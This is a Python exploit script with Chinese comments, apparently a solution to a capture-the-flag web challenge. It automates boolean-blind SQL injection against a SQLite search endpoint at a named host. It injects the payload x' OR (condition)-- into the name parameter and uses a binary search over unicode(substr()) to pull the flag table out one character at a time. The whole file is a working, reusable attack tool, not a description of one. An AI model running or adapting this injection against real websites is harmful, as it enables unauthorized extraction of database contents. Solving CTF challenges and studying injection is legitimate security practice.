#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""exp.py —— 牢九门 / APEX 待加强名单（SQLite 布尔盲注）

目标：http://wjybu0ms2692nxtr.neu-nex.fun/
注入点：GET /search?name=  ->  SELECT ... WHERE name='<name>'
回显：found / not found 两态，无 sleep、无报错 → 布尔盲注
手法：unicode(substr(expr,pos,1)) 二分，逐字符提取
依赖：仅标准库（等价 sqlmap -T flag --dump --technique=B）
用法：python exp.py [--url URL] [--expr SQL]
"""
import argparse
import re
import sys
import urllib.parse
import urllib.request

UA = 'exp/1.0 (+authorized-ctf)'


def make_oracle(base):
    def oracle(cond):
        payload = f"x' OR ({cond})--"
        u = base.rstrip('/') + '/search?name=' + urllib.parse.quote(payload)
        req = urllib.request.Request(u, headers={'User-Agent': UA})
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.read().strip() == b'found'
    return oracle


def ascii_at(oracle, expr, pos):
    lo, hi = 1, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"unicode(substr(({expr}),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def get_int(oracle, expr, hi=100000):
    lo = 0
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f'({expr})>{mid}'):
            lo = mid + 1
        else:
            hi = mid
    return lo


def get_str(oracle, expr, maxlen=120):
    n = get_int(oracle, f'length(({expr}))')
    print(f'    length = {n}')
    out = []
    for i in range(1, n + 1):
        c = ascii_at(oracle, expr, i)
        if c == 0:
            break
        out.append(chr(c))
    return ''.join(out)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--url', default='http://wjybu0ms2692nxtr.neu-nex.fun')
    ap.add_argument('--expr', default='SELECT value FROM flag LIMIT 1')
    args = ap.parse_args()
    oracle = make_oracle(args.url)

    print('[1] oracle 自检')
    t, f = oracle('1=1'), oracle('1=2')
    print(f'    1=1 -> {t} ; 1=2 -> {f}')
    if not (t and not f):
        print('[-] 不是预期的布尔两态')
        return 1

    print(f'[2] 提取 {args.expr}')
    val = get_str(oracle, args.expr)
    print(f'[3] 结果: {val}')
    m = re.search(r'nex\{[A-Za-z0-9_]+\}', val)
    if not m:
        print('[-] 结果不含 flag 格式')
        return 1
    print(f'[+] FLAG: {m.group(0)}')
    return 0


if __name__ == '__main__':
    sys.exit(main())
